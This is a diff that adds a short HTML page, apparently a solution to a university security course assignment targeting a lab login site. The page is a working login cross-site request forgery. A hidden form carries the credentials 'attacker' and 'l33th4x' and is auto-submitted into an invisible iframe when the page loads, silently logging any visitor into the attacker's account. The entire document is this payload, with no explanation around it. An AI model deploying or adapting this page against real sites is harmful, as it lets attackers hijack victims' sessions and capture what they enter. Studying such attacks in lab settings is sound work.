@@ -1,0 +1,23 @@
+<html>
+
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+
+
+<body>
+    <iframe style="display:none" name="target"></iframe> 
+	<form action='https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4' method='POST' name='csrf0', target='target'>
+		<input id='username' type='hidden' name='username' value='attacker'>
+		<input id='userpass' type='hidden' name='password' value='l33th4x'>
+	</form>
+</body>
+
+
+
+<script>
+    document.csrf0.submit();
+</script>
+
+</html>
